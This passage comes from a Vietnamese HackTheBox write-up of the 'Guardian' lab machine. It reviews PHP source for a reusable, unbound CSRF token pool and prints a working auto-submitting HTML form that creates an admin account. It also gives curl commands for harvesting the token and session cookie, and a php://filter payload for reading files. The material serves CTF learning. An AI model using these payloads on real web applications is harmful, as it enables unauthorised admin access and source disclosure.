<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/machines/Guardian/CVE-2025-22131-POC<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python3 -m http.server
</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8000</span> <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
</span></span><span class="line"><span class="cl">10.10.11.84 - - <span class="o">[</span>14/Nov/2025 07:51:14<span class="o">]</span> <span class="s2">&#34;GET /exploit.xlsx HTTP/1.1&#34;</span> <span class="m">200</span> -</span></span></code></pre></div></div>
<p>Mặc dù đã thử thay revershell và upload thành công lên server nhưng tôi không thể kích hoạt được nó chỉ bằng SSRF. Vậy nên chuyển sang 1 hướng khác đó là dựa vào role của user.</p>
<p>Dựa vào source code trên <code>gitea</code> thì <code>portal</code> chỉ có 3 quyền cho user là <code>student</code>, <code>lecture</code> và <code>admin</code>. Vậy thay vì tìm cách để lấy <code>admin</code> user thì tôi có thể tìm cách tạo 1 user với quyền <code>admin</code>, vì dù sao thì tôi cũng nắm source code trong tay.</p>
<p>Tìm kiếm trong repo, có <code>admin/createuser.php</code></p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../includes/auth.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../config/db.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../models/User.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../config/csrf-tokens.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$token</span> <span class="o">=</span> <span class="nx">bin2hex</span><span class="p">(</span><span class="nx">random_bytes</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">add_token_to_pool</span><span class="p">(</span><span class="nv">$token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isAuthenticated</span><span class="p">()</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user_role&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: /login.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$config</span> <span class="o">=</span> <span class="k">require</span> <span class="s1">&#39;../config/config.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$salt</span> <span class="o">=</span> <span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;salt&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$userModel</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="nv">$pdo</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$csrf_token</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;csrf_token&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_valid_token</span><span class="p">(</span><span class="nv">$csrf_token</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Invalid CSRF token!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$full_name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;full_name&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$dob</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dob&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$address</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;address&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user_role</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;user_role&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Check for empty fields
</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$password</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$full_name</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$dob</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$address</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$user_role</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&#34;All fields are required. Please fill in all fields.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$password</span> <span class="o">=</span> <span class="nx">hash</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="nv">$password</span> <span class="o">.</span> <span class="nv">$salt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$data</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="nv">$username</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;password_hash&#39;</span> <span class="o">=&gt;</span> <span class="nv">$password</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;full_name&#39;</span> <span class="o">=&gt;</span> <span class="nv">$full_name</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;email&#39;</span> <span class="o">=&gt;</span> <span class="nv">$email</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;dob&#39;</span> <span class="o">=&gt;</span> <span class="nv">$dob</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;address&#39;</span> <span class="o">=&gt;</span> <span class="nv">$address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;user_role&#39;</span> <span class="o">=&gt;</span> <span class="nv">$user_role</span>        <span class="c1">// Có thể set role tùy ý!!!
</span></span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$userModel</span><span class="o">-&gt;</span><span class="na">create</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: /admin/users.php?created=true&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&#34;Failed to create user. Please try again.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div></div>
<p>Tôi nhận ra nếu lấy được <code>csrf_token</code> của admin user là có thể tạo được user với bất kỳ quyền nào, vì code sẽ trực tiếp gán role cho user mà không qua bước kiểm tra nào.</p>
<p><code>config/csrf_token.php</code></p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$global_tokens_file</span> <span class="o">=</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/tokens.json&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">get_token_pool</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$global_tokens_file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">file_exists</span><span class="p">(</span><span class="nv">$global_tokens_file</span><span class="p">)</span> <span class="o">?</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$global_tokens_file</span><span class="p">),</span> <span class="k">true</span><span class="p">)</span> <span class="o">:</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">add_token_to_pool</span><span class="p">(</span><span class="nv">$token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$global_tokens_file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$tokens</span> <span class="o">=</span> <span class="nx">get_token_pool</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$tokens</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$token</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$global_tokens_file</span><span class="p">,</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$tokens</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">is_valid_token</span><span class="p">(</span><span class="nv">$token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$tokens</span> <span class="o">=</span> <span class="nx">get_token_pool</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">in_array</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="nv">$tokens</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>Nhận thấy có lỗ hổng <strong>CSRF</strong> khá nghiêm trọng ở đây:</p>
<ul>
<li><code>add_token_to_pool()</code> chỉ thêm token vào pool mà không xóa token cũ đã tồn tại.</li>
<li>Tạo token nhưng không gán với session cụ thể nào, chỉ cần token đã tồn tại trong pool thì ai cũng có thể sử dụng token đó, không cần biết user nào đã tạo.</li>
<li>Token không được giới hạn thời gian nên không hết hạn.</li>
</ul>
<p>Từ những dữ kiện trên, tôi có thể sử dụng user <code>Lecturer</code> để tạo <code>csrf token</code> mới, sau đó tạo 1 form submit <code>createuser</code> bằng html, lừa admin user click vào <code>reference_link</code> tải file lên và mở, từ đó form submit sẽ gửi POST request đến server với <code>admin</code> role để tạo 1 user mới với role <code>admin</code></p>
<p>Truy cập form <code>Create Notice</code> để lấy <code>csrf_token</code> của response với <code>PHPSESSID</code> của <code>lecturer</code> user.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://portal.guardian.htb/lecturer/notices/create.php --cookie <span class="s2">&#34;PHPSESSID=&lt;token&gt;&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;csrf_token&#34;</span></span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/machines/Guardian/CVE-2025-22131-POC<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ curl -v http://portal.guardian.htb/lecturer/notices/create.php --cookie <span class="s2">&#34;PHPSESSID=qvqtkv29v2ukncotu7cutusmpc&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;csrf_token&#34;</span>
</span></span><span class="line"><span class="cl">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class="line"><span class="cl">                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class="line"><span class="cl"><span class="m">100</span>  <span class="m">6229</span>    <span class="m">0</span>  <span class="m">6229</span>    <span class="m">0</span>     <span class="m">0</span>  <span class="m">19390</span>      <span class="m">0</span> --:--:-- --:--:-- --:--:-- <span class="m">19404</span>
</span></span><span class="line"><span class="cl">                    &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;csrf_token&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;594c787ec53f1f368b73aa653f9b9ecf&#34;</span>&gt;</span></span></code></pre></div></div>
<p>Lưu lại token này và tạo 1 form <code>create user</code> bằng html</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Inconspicuous Document<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;create-user&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://portal.guardian.htb/admin/createuser.php&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;john&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;GU1234&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;full_name&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;John Doe&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;email&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;john.doe@guardian.htb&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;dob&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;1999-01-01&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;address&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;New York, Mahattan&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;user_role&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;admin&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;csrf_token&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;594c787ec53f1f368b73aa653f9b9ecf&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;create-user&#34;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div></div>
<p>Tạo 1 file <code>.html</code> để lưu lại nội dung form submit, ví dụ như <code>new.html</code></p>
<p>Bật python http server và thực hiện upload file này bằng <code>Create Notice</code></p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1590"
    height="536"
    src="/ctf/hackthebox/guardian/18_hu_146bfef16da48d56.png"
    srcset="/ctf/hackthebox/guardian/18_hu_146bfef16da48d56.png 800w, /ctf/hackthebox/guardian/18_hu_8ef57fffaedc5dc.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/18.png"></figure>
<p><code>Notice created successfully. It is pending approval by the admin.</code></p>
<p>Login với username và password vừa tạo và lấy token của user <code>john</code> rồi lưu vào file <code>cookie.txt</code>.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST http://portal.guardian.htb/login.php -d <span class="s2">&#34;username=john&amp;password=GU1234&#34;</span> -c cookie.txt</span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/machines/Guardian/CVE-2025-22131-POC<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ cat cookie.txt                                                                                    
</span></span><span class="line"><span class="cl"><span class="c1"># Netscape HTTP Cookie File</span>
</span></span><span class="line"><span class="cl"><span class="c1"># https://curl.se/docs/http-cookies.html</span>
</span></span><span class="line"><span class="cl"><span class="c1"># This file was generated by libcurl! Edit at your own risk.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">portal.guardian.htb     FALSE   /       FALSE   <span class="m">0</span>       PHPSESSID       lcq2et7jkams7mclsijr04sj6c</span></span></code></pre></div></div>
<p>Copy token này và paste vào Cookie-Editor trên browser, lưu lại và tải lại trang. Vì token không bao giờ hết hạn nên tôi sẽ lưu lại token này để sử dụng, không cần thông qua session của <code>lecturer</code> user nữa.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1877"
    height="760"
    src="/ctf/hackthebox/guardian/19_hu_ac6d79f9dd97d451.png"
    srcset="/ctf/hackthebox/guardian/19_hu_ac6d79f9dd97d451.png 800w, /ctf/hackthebox/guardian/19_hu_292966e7da1a1e50.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/19.png"></figure>

<h3 class="relative group">RFI
    <div id="rfi" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#rfi" aria-label="Anchor">#</a>
    </span>
    
</h3>
<p>Trong Admin panel, tôi có thêm 1 phần mới là Reports. Truy cập vào site này, nhìn thấy URL với format quen thuộc và nghĩ ngay đến việc thử một các lỗ hổng phổ biến.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1586"
    height="812"
    src="/ctf/hackthebox/guardian/20_hu_b746292b93bf2896.png"
    srcset="/ctf/hackthebox/guardian/20_hu_b746292b93bf2896.png 800w, /ctf/hackthebox/guardian/20_hu_44a8b0b046fa8f95.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/20.png"></figure>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="812"
    height="225"
    src="/ctf/hackthebox/guardian/21_hu_88e97688a73d6827.png"
    srcset="/ctf/hackthebox/guardian/21_hu_88e97688a73d6827.png 800w, /ctf/hackthebox/guardian/21.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/21.png"></figure>
<p>Server trả về một lỗi tương ứng với input nhập vào. Quay trở lại source code để kiểm tra <code>admin/reports.php</code></p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../includes/auth.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../config/db.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isAuthenticated</span><span class="p">()</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user_role&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: /login.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$report</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;report&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;reports/academic.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$report</span><span class="p">,</span> <span class="s1">&#39;..&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;&lt;h2&gt;Malicious request blocked 🚫 &lt;/h2&gt;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^(.*(enrollment|academic|financial|system)\.php)$/&#39;</span><span class="p">,</span> <span class="nv">$report</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;&lt;h2&gt;Access denied. Invalid file 🚫&lt;/h2&gt;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div></div>
<p>Có 2 bộ lọc kiểm tra URL:</p>
<ul>
<li>Nếu trong URL chứa <code>..</code> thì trả về lỗi <code>Malicious request blocked</code></li>
<li>URL buộc phải kết thúc bằng 1 trong số 4 tên file <code>enrollment|academic|financial|system</code> và kết thúc bằng <code>.php</code></li>
</ul>
<p>Thử một số kiểu bypass phổ biến mà tôi hay dùng và nhận ra tôi có thể lấy được nội dung file back-end bằng cách mã hóa base64 với <code>php://filter</code>.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">reports</span><span class="o">/</span><span class="nx">system</span><span class="o">.</span><span class="nx">php</span></span></span></code></pre></div></div>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1513"
    height="594"
    src="/ctf/hackthebox/guardian/22_hu_ae378dd21480d2d3.png"
    srcset="/ctf/hackthebox/guardian/22_hu_ae378dd21480d2d3.png 800w, /ctf/hackthebox/guardian/22_hu_676a148ab2ec5fd0.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/22.png"></figure>
